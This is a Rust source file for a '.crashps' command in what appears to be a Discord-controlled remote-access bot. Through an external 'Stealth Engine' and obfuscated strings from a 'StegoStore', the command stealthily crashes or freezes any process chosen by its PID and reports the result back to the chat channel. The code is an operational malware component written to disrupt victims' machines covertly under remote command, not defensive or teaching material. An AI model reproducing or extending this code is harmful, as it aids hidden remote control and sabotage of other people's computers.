use crate::commands::{BotCommand, Arguments};
use crate::core::http_client::HttpClient;
use crate::stealth::StealthEngine;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_model::channel::message::Message;
use crate::core::stego_store::{StegoStore, StringCategory};

pub struct CrashPsCommand;

impl CrashPsCommand {
    fn s(key: &str) -> String { StegoStore::get(StringCategory::System, key) }
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
}

#[async_trait]
impl BotCommand for CrashPsCommand {
    fn name(&self) -> &str { "crashps" }
    fn description(&self) -> &str { "Stealthily crashes a process" }
    fn category(&self) -> &str { "System" }
    fn usage(&self) -> &str { ".crashps <pid>" }
    fn examples(&self) -> &'static [&'static str] { &[".crashps 1234"] }
    fn aliases(&self) -> &'static [&'static str] { &[] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, mut args: Arguments) -> Result<()> {
        let pid_str = match args.next() {
            Some(arg) => arg,
            None => {
                http.create_message(msg.channel_id.get(), "Usage: .crashps <pid>").await?;
                return Ok(());
            }
        };

        let pid = pid_str.parse::<u32>().unwrap_or(0);
        if pid == 0 {
            http.create_message(msg.channel_id.get(), "Invalid PID").await?;
            return Ok(());
        }

        // Use Nim Stealth Engine to crash the process
        if let Some(engine) = crate::stealth::get_engine() {
            unsafe {
                let result = (engine.crash)(pid);
                if result == 0 {
                    http.create_message(msg.channel_id.get(), &format!("❄️ Process {} is now unresponsive (frozen) via Stealth Engine.", pid)).await?;
                } else {
                    http.create_message(msg.channel_id.get(), &format!("❌ Failed to crash process {} (NTSTATUS: 0x{:08X}).", pid, result as u32)).await?;
                }
            }
        } else {
            http.create_message(msg.channel_id.get(), "❌ Stealth Engine not initialized.").await?;
        }
        
        Ok(())
    }
}
